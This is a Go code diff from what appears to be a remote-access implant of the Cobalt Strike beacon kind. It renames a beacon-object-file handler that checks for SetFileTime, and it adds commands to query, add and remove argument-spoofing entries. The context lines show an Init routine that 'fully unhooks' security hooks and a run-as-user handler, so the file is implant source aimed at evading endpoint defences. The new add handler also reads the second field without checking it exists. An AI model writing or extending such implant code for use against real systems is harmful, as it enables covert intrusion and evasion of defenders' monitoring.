@@ -599,7 +599,7 @@ func CmdExit() ([]byte, error) {
 	return []byte("success exit"), nil
 }
 
-func CMDBof(cmdBuf []byte) ([]byte, error) {
+func CmdBof(cmdBuf []byte) ([]byte, error) {
 	if bytes.Contains(cmdBuf, []byte("SetFileTime")) {
 		buff := bytes.NewBuffer(cmdBuf[8:])
 		_, err := util.ParseAnArg(buff)
@@ -730,4 +730,42 @@ func CmdRunu(b []byte) ([]byte, error) {
 
 func Init() error {
 	return packet.FullUnhook()
+}
+
+func CmdArgueQuery(argues map[string]string) ([]byte, error) {
+	var result []byte
+	for argue := range argues {
+		result = append(result, []byte(argue+"   :   "+argues[argue]+"\n")...)
+	}
+	return result, nil
+}
+
+func CmdArgueRemove(argues map[string]string, b []byte) ([]byte, error) {
+	argue := strings.Trim(string(b), "\x00")
+	_, exist := argues[argue]
+	if !exist {
+		return []byte(argue + " has not been declared."), nil
+	}
+	delete(argues, argue)
+	return []byte(argue + " has been removed from argues."), nil
+}
+
+func CmdArgueAdd(argues map[string]string, b []byte) ([]byte, error) {
+	//argue := strings.Split(strings.Trim(string(b), "\x00"), " ")
+	buff := bytes.NewBuffer(b)
+	_, err := util.ParseAnArg(buff)
+	if err != nil {
+		return nil, err
+	}
+	argueBytes, err := util.ParseAnArg(buff)
+	if err != nil {
+		return nil, err
+	}
+	argue := strings.Split(string(argueBytes), " ")
+	_, exist := argues[argue[0]]
+	if exist && len(argue) == 2 {
+		return []byte(argue[0] + " has been declared."), nil
+	}
+	argues[argue[0]] = argue[1]
+	return []byte(argue[0] + " will be replaced by " + argue[1] + "."), nil
 }
